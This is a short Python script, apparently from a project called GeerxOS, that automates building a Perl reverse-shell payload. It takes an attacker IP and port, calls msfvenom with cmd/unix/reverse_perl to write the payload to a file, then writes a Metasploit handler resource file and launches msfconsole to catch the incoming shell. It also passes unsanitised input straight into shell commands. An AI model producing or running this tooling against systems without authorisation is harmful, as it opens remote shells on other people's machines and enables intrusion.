import os

#GeerxOS on github!

def perl():
    os.system("clear")
    os.system("figlet -f banner Perl ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'cmd/unix/reverse_perl'
    format= 'raw'
    ext= '.pl'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> perl.rb")
    os.system("echo 'set payload "+payload+"' >> perl.rb")
    os.system("echo 'set lhost "+ip+"' >> perl.rb")
    os.system("echo 'set lport "+port+"' >> perl.rb")
    os.system("echo 'exploit' >> perl.rb")
    os.system("gnome-terminal -- msfconsole -r perl.rb &")
    input("Press enter")
    os.system("clear")